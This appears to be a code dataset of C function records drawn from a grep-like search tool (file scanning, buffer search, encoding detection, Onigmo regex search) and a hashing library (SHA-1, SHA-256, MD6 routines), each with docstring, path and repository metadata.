{"docstring": "/* Boyer-Moore-Horspool search */\n", "func_signal": "static UChar*\nbm_search(regex_t* reg, const UChar* target, const UChar* target_end,\n\t  const UChar* text, const UChar* text_end, const UChar* text_range)", "code": "{\n  const UChar *s, *t, *p, *end;\n  const UChar *tail;\n\n#ifdef ONIG_DEBUG_SEARCH\n  fprintf(stderr, \"bm_search: text: %\"PRIuPTR\", text_end: %\"PRIuPTR\", text_range: %\"PRIuPTR\"\\n\",\n\t  text, text_end, text_range);\n#endif\n\n  end = text_range + (target_end - target) - 1;\n  if (end > text_end)\n    end = text_end;\n\n  tail = target_end - 1;\n  s = text + (target_end - target) - 1;\n  if (IS_NULL(reg->int_map)) {\n    while (s < end) {\n      p = s;\n      t = tail;\n#ifdef ONIG_DEBUG_SEARCH\n      fprintf(stderr, \"bm_search_loop: pos: %\"PRIdPTR\" %s\\n\",\n\t  (intptr_t )(s - text), s);\n#endif\n      while (*p == *t) {\n\tif (t == target) return (UChar* )p;\n\tp--; t--;\n      }\n      s += reg->map[*s];\n    }\n  }\n  else { /* see int_map[] */\n    while (s < end) {\n      p = s;\n      t = tail;\n      while (*p == *t) {\n\tif (t == target) return (UChar* )p;\n\tp--; t--;\n      }\n      s += reg->int_map[*s];\n    }\n  }\n  return (UChar* )NULL;\n}", "path": "vendor\\onigmo\\regexec.c", "repo_name": "tkengo/highway", "stars": 236, "license": "mit", "language": "c", "size": 2930}
{"docstring": "/**\n * Search the pattern from the file descriptor and add formatted matched lines to the queue if the\n * pattern was matched in the read buffer. This method processes follow steps:\n * 1. The file content will be read to a large buffer at once.\n * 2. Search the pattern from the read buffer.\n * 3. Scan new line count if need.\n *\n * This method returns match count.\n */\n", "func_signal": "int search(int fd,\n           const char *pattern,\n           int pattern_len,\n           enum file_type t,\n           match_line_list *match_lines,\n           int thread_no)", "code": "{\n    char eol = '\\n';\n    size_t line_count = 0;\n    size_t read_sum = 0;\n    size_t n = NMAX;\n    ssize_t read_len;\n    int buf_offset = 0;\n    int match_count = 0;\n    bool do_search = false;\n    char *buf = (char *)hw_calloc(n + 1, SIZE_OF_CHAR);\n    char *last_new_line_scan_pos = buf;\n    char *last_line_end;\n\n    if (!op.use_regex) {\n        prepare_fjs(pattern, pattern_len, t);\n    }\n\n    while ((read_len = read(fd, buf + buf_offset, NMAX)) > 0) {\n        read_sum += read_len;\n\n        // Search end position of the last line in the buffer. We search from the first position\n        // and end position of the last line.\n        size_t search_len;\n        if (read_len < NMAX) {\n            last_line_end = buf + read_sum;\n            search_len = read_sum;\n            buf[read_sum] = eol;\n        } else {\n            last_line_end = reverse_char(buf + buf_offset, eol, read_len);\n            if (last_line_end == NULL) {\n                buf = last_new_line_scan_pos = grow_buf_if_shortage(&n, read_sum, buf_offset, buf, buf);\n                buf_offset += read_len;\n                continue;\n            }\n            search_len = last_line_end - buf;\n        }\n\n        do_search = true;\n\n        // Search the pattern and construct matching results. The results will be stored to list\n        // `match_lines`.\n        int count = search_buffer(\n            buf,\n            search_len,\n            pattern,\n            pattern_len,\n            t,\n            eol,\n            &line_count,\n            &last_new_line_scan_pos,\n            match_lines,\n            thread_no\n        );\n        match_count += count;\n\n        // If hw search the pattern from stdin stream and find the pattern in the buffer, results\n        // are printed immedeately.\n        if (fd == STDIN_FILENO && count > 0) {\n            file_queue_node stream;\n            stream.t = t;\n            stream.match_lines = match_lines;\n            print_result(&stream);\n\n            // Release memory because matching line was already printed.\n            clear_line_list(match_lines);\n        }\n\n        // Break loop if file pointer is reached to EOF. But if the file descriptor is stdin, we\n        // should wait for next input. For example, if hw search from the pipe that is created by\n        // `tail -f`, we should continue searching until receive a signal.\n        if (fd != STDIN_FILENO && read_len < NMAX) {\n            break;\n        }\n\n        if (op.show_line_number) {\n            last_new_line_scan_pos = scan_newline(last_new_line_scan_pos, last_line_end, &line_count, eol);\n        }\n        last_line_end++;\n\n        ssize_t rest = read_sum - search_len - 1;\n        if (rest >= 0) {\n            char *new_buf = grow_buf_if_shortage(&n, rest, 0, last_line_end, buf);\n            if (new_buf == last_line_end) {\n                new_buf = buf;\n                memmove(new_buf, last_line_end, rest);\n            }\n            buf = last_new_line_scan_pos = new_buf;\n\n            buf_offset = rest;\n            read_sum = rest;\n        }\n    }\n\n    tc_free(buf);\n    return match_count;\n}", "path": "src\\search.c", "repo_name": "tkengo/highway", "stars": 236, "license": "mit", "language": "c", "size": 2930}
{"docstring": "/* Sunday's quick search (ignore case) */\n", "func_signal": "static UChar*\nbm_search_ic(regex_t* reg, const UChar* target, const UChar* target_end,\n\t     const UChar* text, const UChar* text_end, const UChar* text_range)", "code": "{\n  const UChar *s, *p, *end;\n  const UChar *tail;\n  ptrdiff_t tlen1;\n  OnigEncoding enc = reg->enc;\n  int case_fold_flag = reg->case_fold_flag;\n\n#ifdef ONIG_DEBUG_SEARCH\n  fprintf(stderr, \"bm_search_ic: text: %\"PRIdPTR\" (%p), text_end: %\"PRIdPTR\" (%p), text_range: %\"PRIdPTR\" (%p)\\n\",\n\t  (intptr_t )text, text, (intptr_t )text_end, text_end, (intptr_t )text_range, text_range);\n#endif\n\n  tail = target_end - 1;\n  tlen1 = tail - target;\n  end = text_range + tlen1;\n  if (end > text_end)\n    end = text_end;\n\n  s = text + tlen1;\n  if (IS_NULL(reg->int_map)) {\n    while (s < end) {\n      p = s - tlen1;\n      if (str_lower_case_match(enc, case_fold_flag, target, target_end,\n\t\t\t       p, s + 1))\n\treturn (UChar* )p;\n      if (s + 1 >= end) break;\n      s += reg->map[s[1]];\n    }\n  }\n  else { /* see int_map[] */\n    while (s < end) {\n      p = s - tlen1;\n      if (str_lower_case_match(enc, case_fold_flag, target, target_end,\n\t\t\t       p, s + 1))\n\treturn (UChar* )p;\n      if (s + 1 >= end) break;\n      s += reg->int_map[s[1]];\n    }\n  }\n  return (UChar* )NULL;\n}", "path": "vendor\\onigmo\\regexec.c", "repo_name": "tkengo/highway", "stars": 236, "license": "mit", "language": "c", "size": 2930}
{"docstring": "/**\n * Add a filename to the queue and launch the sleeping search worker.\n */\n", "func_signal": "void enqueue_file_exclusively(file_queue *queue, const char *filename)", "code": "{\n    pthread_mutex_lock(&file_mutex);\n    enqueue_file(queue, filename);\n    pthread_cond_signal(&file_cond);\n    pthread_mutex_unlock(&file_mutex);\n}", "path": "src\\scan.c", "repo_name": "tkengo/highway", "stars": 236, "license": "mit", "language": "c", "size": 2930}
{"docstring": "/**\n * Find search target files recursively under the specified directories, and add filenames to the\n * queue used by search worker.\n */\n", "func_signal": "void scan_target(file_queue *queue, const char *dir_path, ignore_hash *ignores, int depth)", "code": "{\n    DIR *dir = opendir(dir_path);\n    if (dir == NULL) {\n        if (errno == EMFILE) {\n            log_w(\"Too many open files (%s). Try to increase fd limit by `ulimit -n N`.\", dir_path);\n        } else {\n            log_w(\"%s can't be opend. %s (%d).\", dir_path, strerror(errno), errno);\n        }\n        return;\n    }\n\n    char buf[MAX_PATH_LENGTH], base[MAX_PATH_LENGTH];\n    if (strcmp(dir_path, \".\") == 0) {\n        strcpy(base, \"\");\n    } else {\n        sprintf(base, \"%s/\", dir_path);\n    }\n\n    bool need_free = false;\n    if (!op.all_files) {\n        sprintf(buf, \"%s%s\", base, GIT_IGNORE_NAME);\n        if (access(buf, F_OK) == 0) {\n            // Create search ignore list from the .gitignore file. New list is created if there are\n            // not ignore file on upper directories, otherwise the list will be inherited.\n            if (ignores == NULL) {\n                ignores = load_ignore_hash(base, buf, depth);\n                need_free = true;\n            } else {\n                ignores = merge_ignore_hash(ignores, base, buf, depth);\n            }\n        }\n    }\n\n    struct dirent *entry;\n    while ((entry = readdir(dir)) != NULL) {\n        // Some file systems ( ex. xfs ) don't support d_type, so override d_type by `lstat`.\n#ifndef _WIN32\n        if (entry->d_type == DT_UNKNOWN) {\n            sprintf(buf, \"%s%s\", base, entry->d_name);\n            struct stat st;\n            lstat(buf, &st);\n            switch (st.st_mode & S_IFMT) {\n                case S_IFREG : entry->d_type = DT_REG ; break;\n                case S_IFDIR : entry->d_type = DT_DIR ; break;\n                case S_IFLNK : entry->d_type = DT_LNK ; break;\n                case S_IFCHR : entry->d_type = DT_CHR ; break;\n                case S_IFBLK : entry->d_type = DT_BLK ; break;\n                case S_IFIFO : entry->d_type = DT_FIFO; break;\n                case S_IFSOCK: entry->d_type = DT_SOCK; break;\n            }\n        }\n#endif\n\n        // `readdir` returns also current or upper directory, but we don't need that directories,\n        // so skip them. And also hidden directory doesn't need.\n        if (is_skip_entry(entry)) {\n            continue;\n        }\n\n        sprintf(buf, \"%s%s\", base, entry->d_name);\n\n        // Check whether if the file is ignored by gitignore. If it is ignored, skip finding.\n        if (!op.all_files && ignores != NULL && is_ignore(ignores, buf, entry)) {\n            continue;\n        }\n\n        // Check if symlink exists. Skip this entry if not exist.\n#ifndef _WIN32\n        if (op.follow_link && entry->d_type == DT_LNK) {\n            char link[MAX_PATH_LENGTH] = { 0 };\n            readlink(buf, link, MAX_PATH_LENGTH);\n            if (access(link, F_OK) != 0) {\n                continue;\n            }\n        }\n#endif\n\n        if (ENTRY_ISDIR(entry)) {\n            scan_target(queue, buf, ignores, depth + 1);\n        } else if (is_search_target_by_entry(entry)) {\n            enqueue_file_exclusively(queue, buf);\n        }\n    }\n\n    if (!op.all_files && ignores != NULL) {\n        free_ignore_hash(ignores, depth);\n\n        if (need_free) {\n            tc_free(ignores);\n        }\n    }\n\n    closedir(dir);\n}", "path": "src\\scan.c", "repo_name": "tkengo/highway", "stars": 236, "license": "mit", "language": "c", "size": 2930}
{"docstring": "/* Sunday's quick search applied to a multibyte string (ignore case) */\n", "func_signal": "static UChar*\nbm_search_notrev_ic(regex_t* reg, const UChar* target, const UChar* target_end,\n\t\t    const UChar* text, const UChar* text_end,\n\t\t    const UChar* text_range)", "code": "{\n  const UChar *s, *se, *t, *end;\n  const UChar *tail;\n  ptrdiff_t skip, tlen1;\n  OnigEncoding enc = reg->enc;\n  int (*mbc_enc_len)(const OnigUChar* p) = enc->mbc_enc_len;\n  int case_fold_flag = reg->case_fold_flag;\n\n#ifdef ONIG_DEBUG_SEARCH\n  fprintf(stderr, \"bm_search_notrev_ic: text: %\"PRIdPTR\" (%p), text_end: %\"PRIdPTR\" (%p), text_range: %\"PRIdPTR\" (%p)\\n\",\n\t  (intptr_t )text, text, (intptr_t )text_end, text_end, (intptr_t )text_range, text_range);\n#endif\n\n  tail = target_end - 1;\n  tlen1 = tail - target;\n  end = text_range;\n  if (end + tlen1 > text_end)\n    end = text_end - tlen1;\n\n  s = text;\n\n  if (IS_NULL(reg->int_map)) {\n    while (s < end) {\n      se = s + tlen1;\n      if (str_lower_case_match(enc, case_fold_flag, target, target_end,\n\t\t\t       s, se + 1))\n\treturn (UChar* )s;\n      if (s + 1 >= end) break;\n      skip = reg->map[se[1]];\n      t = s;\n      do {\n        s += mbc_enc_len(s);\n      } while ((s - t) < skip && s < end);\n    }\n  }\n  else {\n    while (s < end) {\n      se = s + tlen1;\n      if (str_lower_case_match(enc, case_fold_flag, target, target_end,\n\t\t\t       s, se + 1))\n\treturn (UChar* )s;\n      if (s + 1 >= end) break;\n      skip = reg->int_map[se[1]];\n      t = s;\n      do {\n        s += mbc_enc_len(s);\n      } while ((s - t) < skip && s < end);\n    }\n  }\n\n  return (UChar* )NULL;\n}", "path": "vendor\\onigmo\\regexec.c", "repo_name": "tkengo/highway", "stars": 236, "license": "mit", "language": "c", "size": 2930}
{"docstring": "/* Boyer-Moore-Horspool search applied to a multibyte string */\n", "func_signal": "static UChar*\nbm_search_notrev(regex_t* reg, const UChar* target, const UChar* target_end,\n\t\t const UChar* text, const UChar* text_end,\n\t\t const UChar* text_range)", "code": "{\n  const UChar *s, *se, *t, *p, *end;\n  const UChar *tail;\n  ptrdiff_t skip, tlen1;\n\n#ifdef ONIG_DEBUG_SEARCH\n  fprintf(stderr, \"bm_search_notrev: text: %\"PRIuPTR\" (%p), text_end: %\"PRIuPTR\" (%p), text_range: %\"PRIuPTR\" (%p)\\n\",\n\t  text, text, text_end, text_end, text_range, text_range);\n#endif\n\n  tail = target_end - 1;\n  tlen1 = tail - target;\n  end = text_range;\n  if (end + tlen1 > text_end)\n    end = text_end - tlen1;\n\n  s = text;\n\n  if (IS_NULL(reg->int_map)) {\n    while (s < end) {\n      p = se = s + tlen1;\n      t = tail;\n      while (*p == *t) {\n\tif (t == target) return (UChar* )s;\n\tp--; t--;\n      }\n      skip = reg->map[*se];\n      t = s;\n      do {\n        s += enclen(reg->enc, s);\n      } while ((s - t) < skip && s < end);\n    }\n  }\n  else {\n    while (s < end) {\n      p = se = s + tlen1;\n      t = tail;\n      while (*p == *t) {\n\tif (t == target) return (UChar* )s;\n\tp--; t--;\n      }\n      skip = reg->int_map[*se];\n      t = s;\n      do {\n        s += enclen(reg->enc, s);\n      } while ((s - t) < skip && s < end);\n    }\n  }\n\n  return (UChar* )NULL;\n}", "path": "vendor\\onigmo\\regexec.c", "repo_name": "tkengo/highway", "stars": 236, "license": "mit", "language": "c", "size": 2930}
{"docstring": "/**\n * Search the pattern from the buffer as a specified encoding `t`. If matching string was found,\n * results will be added to `match_lines` list. This method do also scanning new lines, and count\n * up it.\n */\n", "func_signal": "int search_buffer(const char *buf,\n                  size_t search_len,\n                  const char *pattern,\n                  int pattern_len,\n                  enum file_type t,\n                  char eol,\n                  size_t *line_count,\n                  char **last_new_line_scan_pos,\n                  match_line_list *match_lines,\n                  int thread_no)", "code": "{\n    match m;\n    const char *p = buf;\n    int after_count = 0;\n    int match_count = 0;\n\n    // Search the first pattern in the buffer.\n    while (search_by(p, search_len, pattern, pattern_len, t, &m, thread_no)) {\n        // Search head/end of the line, then calculate line length from them.\n        int plen = m.end - m.start;\n        size_t rest_len = search_len - m.start - plen + 1;\n        const char *line_head = reverse_char(p, eol, m.start);\n        char *line_end  = memchr(p + m.start + plen, eol, rest_len);\n        line_head = line_head == NULL ? p : line_head + 1;\n\n        // Collect after context.\n        const char *last_line_end_by_after = p;\n        if (match_count > 0 && (op.after_context > 0 || op.context > 0)) {\n            last_line_end_by_after = after_context(line_head, p, search_len, *line_count, match_lines, eol, &after_count);\n        }\n\n        // Count lines.\n        if (op.show_line_number) {\n            *last_new_line_scan_pos = scan_newline(*last_new_line_scan_pos, line_end, line_count, eol);\n        }\n\n        // Collect before context.\n        if (op.before_context > 0 || op.context > 0) {\n            before_context(buf, line_head, last_line_end_by_after, *line_count, match_lines, eol);\n        }\n\n        // Search next pattern in the current line and format them in order to print.\n        m.start -= line_head - p;\n        m.end    = m.start + plen;\n        match_count += format_line(line_head, line_end - line_head, pattern, plen, t, *line_count, &m, match_lines, thread_no);\n\n        size_t diff = line_end - p + 1;\n        if (search_len < diff) {\n            break;\n        }\n        search_len -= diff;\n        p = line_end + 1;\n    }\n\n    // Collect last after context. And calculate max line number in this file in order to do\n    // padding line number on printing result.\n    if (match_count > 0 && search_len > 0 && (op.after_context > 0 || op.context > 0)) {\n        after_context(NULL, p, search_len, *line_count, match_lines, eol, &after_count);\n    }\n    match_lines->max_line_no = *line_count + after_count;\n\n    return match_count;\n}", "path": "src\\search.c", "repo_name": "tkengo/highway", "stars": 236, "license": "mit", "language": "c", "size": 2930}
{"docstring": "/* USE_CAPTURE_HISTORY */\n", "func_signal": "extern void\nonig_region_clear(OnigRegion* region)", "code": "{\n  int i;\n\n  for (i = 0; i < region->num_regs; i++) {\n    region->beg[i] = region->end[i] = ONIG_REGION_NOTPOS;\n  }\n#ifdef USE_CAPTURE_HISTORY\n  history_root_free(region);\n#endif\n}", "path": "vendor\\onigmo\\regexec.c", "repo_name": "tkengo/highway", "stars": 236, "license": "mit", "language": "c", "size": 2930}
{"docstring": "/**\n * Check if the filename is a binary file.\n */\n", "func_signal": "enum file_type detect_file_type(int fd, const char *filename)", "code": "{\n    if (op.stdin_redirect) {\n        return FILE_TYPE_UTF8;\n    }\n\n    // Read the file content only 512-bytes from the header in order to improve speed of the\n    // encoding detection. The detection accuracy of this method is not perfect but fast.\n    char buf[BUF_SIZE_FOR_FILE_TYPE_CHECK];\n\n    int read_bytes = read(fd, buf, BUF_SIZE_FOR_FILE_TYPE_CHECK);\n    if (read_bytes == 0) {\n        return FILE_TYPE_BINARY;\n    }\n    if (lseek(fd, 0, SEEK_SET) == -1) {\n        log_w(\"%s lseek failed. You might want to search again.\", filename);\n    }\n\n    int unknown = 0, utf8 = 0, euc = 0, sjis = 0;\n    for (int i = 0; i < read_bytes; i++) {\n        unsigned char c1 = (unsigned char)buf[i];\n        if (c1 == 0x00) {\n            // NULL character. This is a binary file.\n            return FILE_TYPE_BINARY;\n        } else {\n            // ASCII detection.\n            if (c1 == 0x09 || /* Horizontal tab  */\n                c1 == 0x0A || /* Line feed       */\n                c1 == 0x0D || /* Carriage return */\n                (0x20 <= c1 && c1 < 0x7E) /* Basic Latin block */) {\n                continue;\n            }\n\n            // 2-byte character detection for UTF-8.\n            unsigned char c2;\n            if (i + 1 < read_bytes) {\n                i++;\n                c2 = (unsigned char)buf[i];\n                if (0xC2 <= c1 && c1 <= 0xDF &&\n                    0x80 <= c2 && c2 <= 0xBF) {\n                    utf8++;\n                    continue;\n                }\n            }\n\n            // 3-byte character detection. Only UTF-8.\n            unsigned char c3;\n            if (i + 1 < read_bytes) {\n                i++;\n                c3 = (unsigned char)buf[i];\n                if ((c1 == 0xE0) &&\n                    (0xA0 <= c2 && c2 <= 0xBF) &&\n                    (0x80 <= c3 && c3 <= 0xBF)) {\n                    utf8++;\n                    continue;\n                }\n\n                if (((0xe1 <= c1 && c1 <= 0xec) || c1 == 0xee || c1 == 0xef) &&\n                    ( 0x80 <= c2 && c2 <= 0xbf) &&\n                    ( 0x80 <= c3 && c3 <= 0xbf)) {\n                    utf8++;\n                    continue;\n                }\n\n                if ((c1 == 0xed) &&\n                    (0x80 <= c2 && c2 <= 0x9f) &&\n                    (0x80 <= c3 && c3 <= 0xbf)) {\n                    utf8++;\n                    continue;\n                }\n            }\n\n            // 2-byte character detection for EUC-JP or SHIFT_JIS.\n            if (i + 1 < read_bytes) {\n                if ((c1 == 0x8E) &&\n                    (0xA1 <= c2 && c2 <= 0xDF)) {\n                    euc++;\n                    continue;\n                }\n\n                if ((0xA1 <= c1 && c1 <= 0xFE) &&\n                    (0xA1 <= c2 && c2 <= 0xFE)) {\n                    euc++;\n                    continue;\n                }\n\n                if (((0x81 <= c1 && c1 <= 0x9F) || (0xE0 <= c1 && c1 <= 0xEF)) &&\n                    ((0x40 <= c2 && c2 <= 0x7E) || (0x80 <= c2 && c2 <= 0xFC))) {\n                    sjis++;\n                    continue;\n                }\n            }\n\n            // half-byte character detection. This is Shift-JIS encoding.\n            if (0xA1 <= c1 && c1 <= 0xDF) {\n                sjis++;\n                continue;\n            }\n\n            // Unknown character.\n            unknown++;\n        }\n    }\n\n    if (unknown * 100 / read_bytes > 10) {\n        return FILE_TYPE_BINARY;\n    } else if (utf8 >= euc && utf8 >= sjis) {\n        return FILE_TYPE_UTF8;\n    } else if (euc >= utf8 && euc >= sjis) {\n        return FILE_TYPE_EUC_JP;\n    } else if (sjis >= utf8 && sjis >= euc) {\n        return FILE_TYPE_SHIFT_JIS;\n    } else {\n        return FILE_TYPE_UTF8;\n    }\n}", "path": "src\\file.c", "repo_name": "tkengo/highway", "stars": 236, "license": "mit", "language": "c", "size": 2930}
{"docstring": "/* update the SHA digest */\n", "func_signal": "static void\nsha_update(SHAobject *sha_info, SHA_BYTE *buffer, int count)", "code": "{\n    int i;\n    SHA_INT32 clo;\n\n    clo = sha_info->count_lo + ((SHA_INT32) count << 3);\n    if (clo < sha_info->count_lo) {\n        ++sha_info->count_hi;\n    }\n    sha_info->count_lo = clo;\n    sha_info->count_hi += (SHA_INT32) count >> 29;\n    if (sha_info->local) {\n        i = SHA_BLOCKSIZE - sha_info->local;\n        if (i > count) {\n            i = count;\n        }\n        memcpy(((SHA_BYTE *) sha_info->data) + sha_info->local, buffer, i);\n        count -= i;\n        buffer += i;\n        sha_info->local += i;\n        if (sha_info->local == SHA_BLOCKSIZE) {\n            sha_transform(sha_info);\n        }\n        else {\n            return;\n        }\n    }\n    while (count >= SHA_BLOCKSIZE) {\n        memcpy(sha_info->data, buffer, SHA_BLOCKSIZE);\n        buffer += SHA_BLOCKSIZE;\n        count -= SHA_BLOCKSIZE;\n        sha_transform(sha_info);\n    }\n    memcpy(sha_info->data, buffer, count);\n    sha_info->local = count;\n}", "path": "lib\\sha\\sha256module.c", "repo_name": "brainpicture/hashlib", "stars": 166, "license": "None", "language": "c", "size": 677}
{"docstring": "/* Add padding and terminating bit-count. */\n", "func_signal": "static void\nSHA256_Pad(SHA256_CTX * ctx)", "code": "{\n\tunsigned char len[8];\n\tuint32_t r, plen;\n\n\t/*\n\t * Convert length to a vector of bytes -- we do this now rather\n\t * than later because the length will change after we pad.\n\t */\n\tbe32enc_vect(len, ctx->count, 8);\n\n\t/* Add 1--64 bytes so that the resulting length is 56 mod 64 */\n\tr = (ctx->count[1] >> 3) & 0x3f;\n\tplen = (r < 56) ? (56 - r) : (120 - r);\n\tSHA256_Update(ctx, PAD, (size_t)plen);\n\n\t/* Add the terminating bit-count */\n\tSHA256_Update(ctx, len, 8);\n}", "path": "libhash\\sha256c.c", "repo_name": "brainpicture/hashlib", "stars": 166, "license": "None", "language": "c", "size": 677}
{"docstring": "/*\n * SHA256 block compression function.  The 256-bit state is transformed via\n * the 512-bit input block to produce a new state.\n */\n", "func_signal": "static void\nSHA256_Transform(uint32_t * state, const unsigned char block[64])", "code": "{\n\tuint32_t W[64];\n\tuint32_t S[8];\n\tuint32_t t0, t1;\n\tint i;\n\n\t/* 1. Prepare message schedule W. */\n\tbe32dec_vect(W, block, 64);\n\tfor (i = 16; i < 64; i++)\n\t\tW[i] = s1(W[i - 2]) + W[i - 7] + s0(W[i - 15]) + W[i - 16];\n\n\t/* 2. Initialize working variables. */\n\tmemcpy(S, state, 32);\n\n\t/* 3. Mix. */\n\tRNDr(S, W, 0, 0x428a2f98);\n\tRNDr(S, W, 1, 0x71374491);\n\tRNDr(S, W, 2, 0xb5c0fbcf);\n\tRNDr(S, W, 3, 0xe9b5dba5);\n\tRNDr(S, W, 4, 0x3956c25b);\n\tRNDr(S, W, 5, 0x59f111f1);\n\tRNDr(S, W, 6, 0x923f82a4);\n\tRNDr(S, W, 7, 0xab1c5ed5);\n\tRNDr(S, W, 8, 0xd807aa98);\n\tRNDr(S, W, 9, 0x12835b01);\n\tRNDr(S, W, 10, 0x243185be);\n\tRNDr(S, W, 11, 0x550c7dc3);\n\tRNDr(S, W, 12, 0x72be5d74);\n\tRNDr(S, W, 13, 0x80deb1fe);\n\tRNDr(S, W, 14, 0x9bdc06a7);\n\tRNDr(S, W, 15, 0xc19bf174);\n\tRNDr(S, W, 16, 0xe49b69c1);\n\tRNDr(S, W, 17, 0xefbe4786);\n\tRNDr(S, W, 18, 0x0fc19dc6);\n\tRNDr(S, W, 19, 0x240ca1cc);\n\tRNDr(S, W, 20, 0x2de92c6f);\n\tRNDr(S, W, 21, 0x4a7484aa);\n\tRNDr(S, W, 22, 0x5cb0a9dc);\n\tRNDr(S, W, 23, 0x76f988da);\n\tRNDr(S, W, 24, 0x983e5152);\n\tRNDr(S, W, 25, 0xa831c66d);\n\tRNDr(S, W, 26, 0xb00327c8);\n\tRNDr(S, W, 27, 0xbf597fc7);\n\tRNDr(S, W, 28, 0xc6e00bf3);\n\tRNDr(S, W, 29, 0xd5a79147);\n\tRNDr(S, W, 30, 0x06ca6351);\n\tRNDr(S, W, 31, 0x14292967);\n\tRNDr(S, W, 32, 0x27b70a85);\n\tRNDr(S, W, 33, 0x2e1b2138);\n\tRNDr(S, W, 34, 0x4d2c6dfc);\n\tRNDr(S, W, 35, 0x53380d13);\n\tRNDr(S, W, 36, 0x650a7354);\n\tRNDr(S, W, 37, 0x766a0abb);\n\tRNDr(S, W, 38, 0x81c2c92e);\n\tRNDr(S, W, 39, 0x92722c85);\n\tRNDr(S, W, 40, 0xa2bfe8a1);\n\tRNDr(S, W, 41, 0xa81a664b);\n\tRNDr(S, W, 42, 0xc24b8b70);\n\tRNDr(S, W, 43, 0xc76c51a3);\n\tRNDr(S, W, 44, 0xd192e819);\n\tRNDr(S, W, 45, 0xd6990624);\n\tRNDr(S, W, 46, 0xf40e3585);\n\tRNDr(S, W, 47, 0x106aa070);\n\tRNDr(S, W, 48, 0x19a4c116);\n\tRNDr(S, W, 49, 0x1e376c08);\n\tRNDr(S, W, 50, 0x2748774c);\n\tRNDr(S, W, 51, 0x34b0bcb5);\n\tRNDr(S, W, 52, 0x391c0cb3);\n\tRNDr(S, W, 53, 0x4ed8aa4a);\n\tRNDr(S, W, 54, 0x5b9cca4f);\n\tRNDr(S, W, 55, 0x682e6ff3);\n\tRNDr(S, W, 56, 0x748f82ee);\n\tRNDr(S, W, 57, 0x78a5636f);\n\tRNDr(S, W, 58, 0x84c87814);\n\tRNDr(S, W, 59, 0x8cc70208);\n\tRNDr(S, W, 60, 0x90befffa);\n\tRNDr(S, W, 61, 0xa4506ceb);\n\tRNDr(S, W, 62, 0xbef9a3f7);\n\tRNDr(S, W, 63, 0xc67178f2);\n\n\t/* 4. Mix local working variables into global state */\n\tfor (i = 0; i < 8; i++)\n\t\tstate[i] += S[i];\n}", "path": "libhash\\sha256c.c", "repo_name": "brainpicture/hashlib", "stars": 166, "license": "None", "language": "c", "size": 677}
{"docstring": "/* Extract last d bits of chaining variable as hash value.\n*/\n", "func_signal": "void trim_hashval(md6_state *st)", "code": "{ /* trim hashval to desired length d bits by taking only last d bits */\n  /* note that high-order bit of a byte is considered its *first* bit */\n  int full_or_partial_bytes = (st->d+7)/8;\n  int bits = st->d % 8;                 /* bits in partial byte */\n  int i;\n\n  /* move relevant bytes to the front */\n  for ( i=0; i<full_or_partial_bytes; i++ )\n    st->hashval[i] = st->hashval[c*(w/8)-full_or_partial_bytes+i];\n\n  /* zero out following bytes */\n  for ( i=full_or_partial_bytes; i<c*(w/8); i++ )\n    st->hashval[i] = 0;\n\n  /* shift result left by (8-bits) bit positions, per byte, if needed */\n  if (bits>0)\n    { for ( i=0; i<full_or_partial_bytes; i++ )\n\t{ st->hashval[i] = (st->hashval[i] << (8-bits));\n\t  if ( (i+1) < c*(w/8) )\n\t    st->hashval[i] |= (st->hashval[i+1] >> bits);\n\t}\n    }\n}", "path": "lib\\md6\\md6_mode.c", "repo_name": "brainpicture/hashlib", "stars": 166, "license": "None", "language": "c", "size": 677}
{"docstring": "/* update the SHA digest */\n", "func_signal": "static void\nsha_update(SHAobject *sha_info, SHA_BYTE *buffer, int count)", "code": "{\n    int i;\n    SHA_INT32 clo;\n\n    clo = sha_info->count_lo + ((SHA_INT32) count << 3);\n    if (clo < sha_info->count_lo) {\n        ++sha_info->count_hi;\n    }\n    sha_info->count_lo = clo;\n    sha_info->count_hi += (SHA_INT32) count >> 29;\n    if (sha_info->local) {\n        i = SHA_BLOCKSIZE - sha_info->local;\n        if (i > count) {\n            i = count;\n        }\n        memcpy(((SHA_BYTE *) sha_info->data) + sha_info->local, buffer, i);\n        count -= i;\n        buffer += i;\n        sha_info->local += i;\n        if (sha_info->local == SHA_BLOCKSIZE) {\n            sha_transform(sha_info);\n        }\n        else {\n            return;\n        }\n    }\n    while (count >= SHA_BLOCKSIZE) {\n        memcpy(sha_info->data, buffer, SHA_BLOCKSIZE);\n        buffer += SHA_BLOCKSIZE;\n        count -= SHA_BLOCKSIZE;\n        sha_transform(sha_info);\n    }\n    memcpy(sha_info->data, buffer, count);\n    sha_info->local = count;\n}", "path": "lib\\sha\\shamodule.c", "repo_name": "brainpicture/hashlib", "stars": 166, "license": "None", "language": "c", "size": 677}
{"docstring": "/*\n * Encode a length len/4 vector of (uint32_t) into a length len vector of\n * (unsigned char) in big-endian form.  Assumes len is a multiple of 4.\n */\n", "func_signal": "static void\nbe32enc_vect(unsigned char *dst, const uint32_t *src, size_t len)", "code": "{\n\tsize_t i;\n\n\tfor (i = 0; i < len / 4; i++)\n\t\tbe32enc(dst + i * 4, src[i]);\n}", "path": "libhash\\sha256c.c", "repo_name": "brainpicture/hashlib", "stars": 166, "license": "None", "language": "c", "size": 677}
{"docstring": "/* do SHA transformation */\n", "func_signal": "static void\nsha_transform(SHAobject *sha_info)", "code": "{\n    int i;\n    SHA_INT32 T, A, B, C, D, E, W[80], *WP;\n\n    memcpy(W, sha_info->data, sizeof(sha_info->data));\n    longReverse(W, (int)sizeof(sha_info->data), sha_info->Endianness);\n\n    for (i = 16; i < 80; ++i) {\n\tW[i] = W[i-3] ^ W[i-8] ^ W[i-14] ^ W[i-16];\n\n\t/* extra rotation fix */\n\tW[i] = R32(W[i], 1);\n    }\n    A = sha_info->digest[0];\n    B = sha_info->digest[1];\n    C = sha_info->digest[2];\n    D = sha_info->digest[3];\n    E = sha_info->digest[4];\n    WP = W;\n#ifdef UNRAVEL\n    FA(1); FB(1); FC(1); FD(1); FE(1); FT(1); FA(1); FB(1); FC(1); FD(1);\n    FE(1); FT(1); FA(1); FB(1); FC(1); FD(1); FE(1); FT(1); FA(1); FB(1);\n    FC(2); FD(2); FE(2); FT(2); FA(2); FB(2); FC(2); FD(2); FE(2); FT(2);\n    FA(2); FB(2); FC(2); FD(2); FE(2); FT(2); FA(2); FB(2); FC(2); FD(2);\n    FE(3); FT(3); FA(3); FB(3); FC(3); FD(3); FE(3); FT(3); FA(3); FB(3);\n    FC(3); FD(3); FE(3); FT(3); FA(3); FB(3); FC(3); FD(3); FE(3); FT(3);\n    FA(4); FB(4); FC(4); FD(4); FE(4); FT(4); FA(4); FB(4); FC(4); FD(4);\n    FE(4); FT(4); FA(4); FB(4); FC(4); FD(4); 